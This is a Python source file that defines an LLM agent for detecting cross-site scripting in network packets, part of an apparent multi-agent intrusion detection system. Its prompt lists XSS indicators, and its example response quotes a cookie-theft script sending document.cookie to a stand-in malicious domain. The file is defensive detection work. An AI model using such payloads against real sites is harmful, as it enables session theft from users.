from utils.models import ParallelState
from langchain.prompts import ChatPromptTemplate
from langchain.output_parsers import ResponseSchema, StructuredOutputParser
from agents.base import llm

xss_schema = [
    ResponseSchema(
        name="xss_detected",
        description="Either 'YES' if XSS is detected or 'NO' if not"
    ),
    ResponseSchema(
        name="details",
        description="Detailed analysis of the packet's potential XSS vulnerabilities"
    )
]

TEMPLATE="""You are an XSS (Cross-Site Scripting) Analysis Expert Agent, specialized in detecting XSS attacks within network packets. You are part of a multi-agent system where each agent has a specific focus - your expertise is exclusively in identifying malicious client-side script injection attempts.

Your task:
Analyze the provided packet specifically for XSS attack patterns. You should examine the payload field for:
- Injected script tags (<script>)
- JavaScript event handlers (onclick, onload, onerror, etc.)
- JavaScript URI schemes (javascript:)
- DOM manipulation attempts
- Cookie theft patterns
- Data exfiltration scripts
- Encoded JavaScript content (base64, URL encoding, HTML entities)
- HTML5 script injection vectors (SVG scripts, etc.)

Key indicators you should watch for:
- Scripts attempting to access sensitive browser objects (document.cookie, localStorage)
- Data transmission to external domains
- Encoding/obfuscation of JavaScript
- Event handler injection
- HTML attribute manipulation
- Use of eval() or similar dangerous functions
- Script tag variations and evasion techniques

Here is the packet information:
{packet}

Examine the packet carefully for XSS patterns. Your response must be structured as follows:
1. xss_detected: Must be exactly "YES" if an XSS attack is detected, or "NO" if not
2. details: A detailed analysis explaining:
   - If YES: Description of the malicious script found, its type, and why it's considered dangerous
   - If NO: Brief confirmation that no XSS patterns were detected

Example Response 1 (Attack Detected):
{{
    "xss_detected": "YES",
    "details": "Detected malicious XSS payload in packet. Found script: '<script>document.cookie.send('https://malicious.site')</script>'. This is a cookie theft attack attempting to exfiltrate session data to an external domain. The script directly accesses document.cookie and attempts unauthorized data transmission."
}}

Example Response 2 (No Attack):
{{
    "xss_detected": "NO",
    "details": "No XSS attack patterns detected in packet payload. Payload was examined for script injection, event handlers, and encoded malicious content - none were found."
}}

Remember:
- Focus only on XSS patterns
- Ignore other security concerns
- Check for both obvious and obfuscated attempts
- Examine encoded content for hidden scripts
- Consider context of script placement
- Look for common evasion techniques

{format_instructions}
"""

prompt = ChatPromptTemplate.from_template(template=TEMPLATE)
xss_parser = StructuredOutputParser.from_response_schemas(xss_schema)

def xss_agent(state: ParallelState):
  packet = state.packet

  chain = prompt | llm | xss_parser
  try:
    res = chain.invoke({
      "packet": packet,
      "format_instructions": xss_parser.get_format_instructions()
    })
    print("xss agent response: ", res)
    print("xxs detected??: ", res["xss_detected"])
    return {"xss_agent_msg": str(res["details"])}

  except Exception as e:
    print("ERROR invoking the chain in xss_agent:", e)
    return {"xss_agent_msg": "Error invoking the chain. Ignore the output of the XSS Agent feedback for the final evaluation."}


